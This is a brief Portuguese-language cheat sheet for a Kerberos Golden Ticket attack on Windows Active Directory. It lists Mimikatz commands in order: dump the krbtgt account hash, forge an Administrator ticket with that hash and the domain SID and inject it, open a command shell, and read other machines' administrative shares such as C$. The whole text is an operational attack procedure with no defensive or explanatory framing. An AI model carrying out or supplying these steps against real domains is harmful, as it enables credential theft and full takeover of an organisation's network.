PARA O ATAQUE GOLDEN TICKET É NECESSÁRIO VOCÊ TER A HASH DO USUÁRIO KRBTGT
PARA GERAR OS TICKETS, E PODE SE OBTER ESSA HASH PELO MIMIKATZ, PARA FAZER
O ATAQUE TAMBÉM SERÁ NECESSÁRIO O MIMIKATZ.
	
	1.VER AS INFORMAÇÕES NECESSÁRIAS PARA O ATAQUE.
	
		COMANDO: lsadump::lsa /inject /name:krbtgt
		
	2.EFETUAR O ATAQUE.
		
		COMANDO: kerberos::golden /User:Administrator /domain:<nome_dominio> /sid:<sid> /krbtgt:<hash_krbtgt> /id:500 /ptt
			
			<sid>: O SID FICARÁ DO LADO DO NOME DO DOMINIO QUANDO SE EXECUTA O LSADUMP.
			
	3.ABRIR O CMD PELO MIMIKATZ LOGO APÓS AFETUAR O ATAQUE.
		
		COMANDO: misc::cmd
		
	4.APÓS ISSO VOCÊ TERÁ PERMISSÃO PARA ACESSAR QUALQUER SISTEMA E ARQUIVOS DOS SISTEMAS
	PELO CMD ABERTO.
			
			COMANDO PARA ACESSAR DERETÓRIOS DE OUTROS SISTEMAS: dir \\<nome_sistema>\<nome_diretorio>
			
			EX: dir\\WOKSATION-01\C$
